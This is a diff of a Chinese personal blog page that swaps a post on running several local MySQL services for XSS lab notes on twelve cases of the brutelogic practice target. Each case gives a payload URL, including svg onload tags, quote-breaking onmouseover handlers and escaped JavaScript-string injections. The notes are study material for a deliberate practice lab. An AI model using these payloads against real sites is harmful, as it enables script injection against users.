@@ -6,16 +6,16 @@
   <meta name="author" content="FengHLZ">
   
   
-  <title>对本地三个MySQL数据库进行管理 | xyz|All</title>
+  <title>XSS练习笔记 | xyz|All</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="随笔笔记,">
+    <meta name="keywords" content="Web安全,">
   
 
   
-  <meta name="description" content="三个数据库：本地安装wampphpstudy（最近为了看乌云漏洞库才安装，也发现了一大堆问题）">
+  <meta name="description" content="一个基础的、面向新手的XSS靶场">
 
   
 
@@ -109,11 +109,11 @@
   <div class="passage">
   <div class="passage-meta">
     <span>
-      <i class="fa fa-calendar"></i>2019-06-12
+      <i class="fa fa-calendar"></i>2019-03-25
     </span>
     
       <span>
-        | <a href="/categories/随笔笔记/"><i class="fa fa-bookmark"></i>随笔笔记</a>
+        | <a href="/categories/Web安全/"><i class="fa fa-bookmark"></i>Web安全</a>
       </span>
     
     
@@ -123,24 +123,40 @@
     
   </div>
   <h1 class="passage-title">
-    对本地三个MySQL数据库进行管理
+    XSS练习笔记
   </h1>
   
   <article class="passage-article">
-    <h2 id="安装的独立MySQL"><a href="#安装的独立MySQL" class="headerlink" title="安装的独立MySQL"></a>安装的独立MySQL</h2><p>之前学习MySQL时还没有安装集成环境，用得也挺舒服的。<br>安装好后会在系统服务中添加MySQL服务，开启命令：<code>net start mysql</code>，但现在对我来说已经没用了。<br>bin目录下的 <code>mysqld-nt.exe</code> 也就是启动MySQL服务用的。</p>
-<h2 id="wamp的MySQL"><a href="#wamp的MySQL" class="headerlink" title="wamp的MySQL"></a>wamp的MySQL</h2><p>wamp也还可以，就是版本太少了，迫不得已转战phpstudy。<br>当时安装好wamp后，也没遇到什么大问题，只是有时候系统的MySQL服务没关，导致连接不上，关掉即可（命令关闭或者服务中关闭）。</p>
-<h2 id="phpstudy的MySQL"><a href="#phpstudy的MySQL" class="headerlink" title="phpstudy的MySQL"></a>phpstudy的MySQL</h2><p>安装好后就是不能启动MySQL服务，查询资料解释如下：</p>
+    <h1 id="XSS练习笔记"><a href="#XSS练习笔记" class="headerlink" title="XSS练习笔记"></a>XSS练习笔记</h1><p>XSS基础知识：<br><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting</a></p>
+<p>练习靶场：<br><a href="https://brutelogic.com.br/xss.php" target="_blank" rel="noopener">https://brutelogic.com.br/xss.php</a></p>
+<p>官方WP：<br><a href="https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/" target="_blank" rel="noopener">https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/</a></p>
+<h2 id="1-URL-Reflection"><a href="#1-URL-Reflection" class="headerlink" title="1. URL Reflection"></a>1. URL Reflection</h2><p>当URL以某种方式显示在源代码中时，我们可以添加自己的<code>XSS向量</code>或者<code>payload</code>。对于PHP页面，可以<strong>使用斜杠字符</strong> <code>/</code> 在页面名称之后添加任何内容（不更改它）。</p>
+<p><img src="rAdL61s.png" alt><br>如上图，URL的值会显示在<code>action</code>属性中<br>payload：<code>http://brutelogic.com.br/xss.php/&quot;&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="2-Simple-HTMLi-HTML-injection"><a href="#2-Simple-HTMLi-HTML-injection" class="headerlink" title="2. Simple HTMLi (HTML injection)"></a>2. Simple HTMLi (HTML injection)</h2><p>输入的内容在现有标签之间。没有过滤任何东西。<br><img src="zAUOs5P.png" alt><br>如上图，<code>guest</code>的值就是参数<code>a</code>的值。<br>payload：<code>http://brutelogic.com.br/xss.php?a=&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="3-Inline-HTMLi-Double-Quotes"><a href="#3-Inline-HTMLi-Double-Quotes" class="headerlink" title="3. Inline HTMLi (Double Quotes)"></a>3. Inline HTMLi (Double Quotes)</h2><p>可以使用<code>&quot;&gt;</code>将其闭合。<br><img src="FAD1ytQ.png" alt><br>payload：<code>http://brutelogic.com.br/xss.php?b1=&quot;&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="4-Inline-HTMLi-Single-Quotes"><a href="#4-Inline-HTMLi-Single-Quotes" class="headerlink" title="4. Inline HTMLi (Single Quotes)"></a>4. Inline HTMLi (Single Quotes)</h2><p>跟上面一样，使用<code>&#39;&gt;</code>进行闭合<br><img src="DRvisKI.png" alt><br>payload：<code>https://brutelogic.com.br/xss.php?b2=&#39;&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="5-Inline-HTMLi-No-Tag-Breaking-Double-Quotes"><a href="#5-Inline-HTMLi-No-Tag-Breaking-Double-Quotes" class="headerlink" title="5. Inline HTMLi - No Tag Breaking (Double Quotes)"></a>5. Inline HTMLi - No Tag Breaking (Double Quotes)</h2><p>该内联HTML注入中转义了<code>&gt;</code>不能像上一关那样使用<code>&quot;&gt;</code>闭合</p>
+<p><img src="Vue05Vr.png" alt></p>
+<p>可以<code>&quot;</code>闭合后，增加一个<code>onmouseover</code>属性<br>payload：<code>http://brutelogic.com.br/xss.php?b3=&quot; onmouseover=alert(1)//</code></p>
 <blockquote>
-<p>可能是之前已经装过Mysql，要把系统服务里面的MySQL删除，留下MySQLa服务。<br>在cmd命令行下输入：<code>sc delete mysql</code> 即可删除。</p>
+<p>双斜线注释掉<code>&quot;</code></p>
 </blockquote>
-<p>的确，这样就能够启动phpstudy自带的MySQL服务了。但是原先系统安装的MySQL服务给删除了，不方便一键启动了，毕竟做项目啥的数据库文件还是喜欢放在本地第一次安装的MySQL中，因为扩展多，支持的功能多（<del>我也没有项目可做！</del>）。</p>
-<h2 id="分别启动三个MySQL服务"><a href="#分别启动三个MySQL服务" class="headerlink" title="分别启动三个MySQL服务"></a>分别启动三个MySQL服务</h2><p>首先，命令行下输入 <code>mysql -uroot -p</code> 就可以连接一个本地的MySQL服务。</p>
-<h3 id="连接wamp的MySQL"><a href="#连接wamp的MySQL" class="headerlink" title="连接wamp的MySQL"></a>连接wamp的MySQL</h3><p>首先打开任务管理器，看一下其他的MySQL服务是不是还在运行，一般是在详细信息中显示 <code>mysqld.exe</code> 或者 <code>mysqld-nt.exe</code> 。<br>确保没有其他正在运行就直接打开wamp，它就会运行MySQL服务，直接命令行下 <code>mysql -uroot -p</code> 就可连接。<br><strong>记住退出wamp之前将所有服务先关闭。</strong></p>
-<h3 id="连接phpstudy的MySQL服务"><a href="#连接phpstudy的MySQL服务" class="headerlink" title="连接phpstudy的MySQL服务"></a>连接phpstudy的MySQL服务</h3><p>同样先查看有没有其他MySQL服务正在运行。还有就是得删除原先系统安装的MySQL服务。<br>运行phpstudy后就命令行下连接MySQL。<br><strong>记住退出phpstudy之前将所有服务先关闭。</strong></p>
-<h3 id="连接系统安装的MySQL服务"><a href="#连接系统安装的MySQL服务" class="headerlink" title="连接系统安装的MySQL服务"></a>连接系统安装的MySQL服务</h3><p>首先确保没有其他MySQL服务在运行，有的话直接kill。<br>然后找到 <code>bin</code> 目录下的 <code>mysql-nt.exe</code> ，双击运行。命令行下运行也可，但是会占用当前命令行。</p>
-<p><img src="./1.png" alt></p>
-<p>命令连接MySQL服务即可。</p>
-<p>同样，记得关闭这个服务，直接在任务管理器中暴力kill。</p>
+<p>演示结果：<br><img src="BS0cNvE.png" alt></p>
+<p>也可以使用<code>&quot;alert(1)&quot;</code><br>payload：<code>http://brutelogic.com.br/xss.php?b3=&quot; onmouseover=&quot;alert(1)</code></p>
+<p>演示结果：<br><img src="v21UcYg.png" alt></p>
+<h2 id="6-Inline-HTMLi-No-Tag-Breaking-Single-Quotes"><a href="#6-Inline-HTMLi-No-Tag-Breaking-Single-Quotes" class="headerlink" title="6. Inline HTMLi - No Tag Breaking (Single Quotes)"></a>6. Inline HTMLi - No Tag Breaking (Single Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?b4=&#39; onmouseover=alert(1)//</code><br>payload：<code>http://brutelogic.com.br/xss.php?b4=&#39; onmouseover=&#39;alert(1)</code></p>
+<h2 id="7-HTMLi-in-Js-Block-Single-Quotes"><a href="#7-HTMLi-in-Js-Block-Single-Quotes" class="headerlink" title="7. HTMLi in Js Block (Single Quotes)"></a>7. HTMLi in Js Block (Single Quotes)</h2><p>输入有时会进入一个javascript块（脚本标签），通常是代码的某个变量的值。<br>但是因为<strong>HTML标签在浏览器的解析中具有优先权</strong>，所以我们可以简单地终止JS块并插入新标签。</p>
+<p><img src="JKhLB3x.png" alt></p>
+<p>payload：<code>http://brutelogic.com.br/xss.php?c1=&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="8-HTMLi-in-Js-Block-Double-Quotes"><a href="#8-HTMLi-in-Js-Block-Double-Quotes" class="headerlink" title="8. HTMLi in Js Block (Double Quotes)"></a>8. HTMLi in Js Block (Double Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?c2=&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<h2 id="9-Simple-Js-Injection-Single-Quotes"><a href="#9-Simple-Js-Injection-Single-Quotes" class="headerlink" title="9. Simple Js Injection (Single Quotes)"></a>9. Simple Js Injection (Single Quotes)</h2><p>跟上一关的情况类似，输入的值显示在JS代码块中，但是过滤了<code>&lt;</code>，无法使用<code>&lt;/script&gt;</code>闭合JS代码块。<br>所以要进行的是注入javascript代码，并且注意语法。方法是<strong>连接</strong>我们想要执行的代码，使用<code>-</code>连接。单引号进行闭合。</p>
+<p>payload：<code>http://brutelogic.com.br/xss.php?c3=&#39;-alert(1)-&#39;</code></p>
+<p>演示结果：<br><img src="ssLX7bt.png" alt></p>
+<h2 id="10-Simple-Js-Injection-Double-Quotes"><a href="#10-Simple-Js-Injection-Double-Quotes" class="headerlink" title="10. Simple Js Injection (Double Quotes)"></a>10. Simple Js Injection (Double Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?c4=&quot;-alert(1)-&quot;</code></p>
+<h2 id="11-Escaped-Js-Injection-Single-Quotes"><a href="#11-Escaped-Js-Injection-Single-Quotes" class="headerlink" title="11. Escaped Js Injection (Single Quotes)"></a>11. Escaped Js Injection (Single Quotes)</h2><p>该题中，对输入的<code>&#39;</code>进行了转义：<code>&#39;</code>–&gt;<code>\&#39;</code>，就直接输出了<code>&#39;</code>，而无法注入。<br>可以输入在<code>&#39;</code>前输入<code>\</code>，使得转义后变成<code>\\&#39;</code>，那么最终输出的值为<code>\</code>，而<code>&#39;</code>不作为值。必要时需要使用<code>//</code>注释掉后面多余的字符。<br>payload：<code>http://brutelogic.com.br/xss.php?c5=\&#39;-alert(1)//</code></p>
+<p>演示结果：<br><img src="ZsdyJbm.png" alt></p>
+<h2 id="12-Escaped-Js-Injection-Double-Quotes"><a href="#12-Escaped-Js-Injection-Double-Quotes" class="headerlink" title="12. Escaped Js Injection (Double Quotes)"></a>12. Escaped Js Injection (Double Quotes)</h2><p>同上</p>
+<p>payload：<code>http://brutelogic.com.br/xss.php?c6=\&quot;-alert(1)//</code></p>
   </article>
   <aside class="table-content" id="site-toc">
   <div class="table-content-title">
@@ -148,7 +164,7 @@
     <span>目录</span>
   </div>
   <div class="table-content-main">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装的独立MySQL"><span class="toc-text">安装的独立MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wamp的MySQL"><span class="toc-text">wamp的MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpstudy的MySQL"><span class="toc-text">phpstudy的MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分别启动三个MySQL服务"><span class="toc-text">分别启动三个MySQL服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#连接wamp的MySQL"><span class="toc-text">连接wamp的MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#连接phpstudy的MySQL服务"><span class="toc-text">连接phpstudy的MySQL服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#连接系统安装的MySQL服务"><span class="toc-text">连接系统安装的MySQL服务</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS练习笔记"><span class="toc-text">XSS练习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-URL-Reflection"><span class="toc-text">1. URL Reflection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Simple-HTMLi-HTML-injection"><span class="toc-text">2. Simple HTMLi (HTML injection)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Inline-HTMLi-Double-Quotes"><span class="toc-text">3. Inline HTMLi (Double Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Inline-HTMLi-Single-Quotes"><span class="toc-text">4. Inline HTMLi (Single Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Inline-HTMLi-No-Tag-Breaking-Double-Quotes"><span class="toc-text">5. Inline HTMLi - No Tag Breaking (Double Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Inline-HTMLi-No-Tag-Breaking-Single-Quotes"><span class="toc-text">6. Inline HTMLi - No Tag Breaking (Single Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-HTMLi-in-Js-Block-Single-Quotes"><span class="toc-text">7. HTMLi in Js Block (Single Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-HTMLi-in-Js-Block-Double-Quotes"><span class="toc-text">8. HTMLi in Js Block (Double Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-Simple-Js-Injection-Single-Quotes"><span class="toc-text">9. Simple Js Injection (Single Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-Simple-Js-Injection-Double-Quotes"><span class="toc-text">10. Simple Js Injection (Double Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-Escaped-Js-Injection-Single-Quotes"><span class="toc-text">11. Escaped Js Injection (Single Quotes)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-Escaped-Js-Injection-Double-Quotes"><span class="toc-text">12. Escaped Js Injection (Double Quotes)</span></a></li></ol></li></ol>
   </div>
 </aside>
   
@@ -157,7 +173,7 @@
       
         <div>
           原文链接: 
-          <a href="" target="_blank">https://www.fenghlz.xyz/passages/2019-6-12-对本地三个MySQL数据库进行管理/</a>
+          <a href="" target="_blank">https://www.fenghlz.xyz/passages/2019-03-25-XSS练习笔记/</a>
         </div>
       
       <div>
@@ -298,10 +314,10 @@
 
 <div class="bottom-bar">
   <div class="bottom-bar-left">
-    <a href="/passages/vulhub练习笔记/" data-enable="true">
+    <a href="/passages/2019-6-12-对本地三个MySQL数据库进行管理/" data-enable="true">
       <i class="fa fa-arrow-left"></i>
     </a>
-    <a href="/passages/2019-03-25-XSS练习笔记/" data-enable="true">
+    <a href="/passages/Code-Breaking2018/" data-enable="true">
       <i class="fa fa-arrow-right"></i>
     </a>
   </div>
